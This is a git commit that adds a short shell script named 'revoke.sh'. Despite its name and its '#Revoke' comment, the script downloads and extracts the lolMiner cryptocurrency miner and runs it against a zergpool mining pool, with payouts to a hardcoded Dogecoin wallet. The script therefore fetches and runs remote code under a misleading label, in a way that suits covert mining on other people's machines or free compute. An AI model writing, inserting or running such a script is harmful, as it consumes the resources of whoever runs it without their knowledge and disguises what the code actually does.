561a18f1d014c22bf7cf7f18c3514f4e7ada6bf9
postsnarrator <kapilramudamu04@gmail.com>
2021-06-13 17:27:45 +0530

    Add files via upload

---
+++ revoke.sh
@@ -0,0 +1,5 @@
+#Revoke
+sudo apt update
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz && tar -xf lolMiner_v1.29_Lin64.tar.gz
+cd 1.29
+./lolMiner --algo cryptonight-upx/2 --pool stratum+tcp://cryptonight_upx.mine.zergpool.com:4457 --user DOGE:D6EUU5hyBF4N41AsYC6rVisauNMPwdAUP1.fadedunion
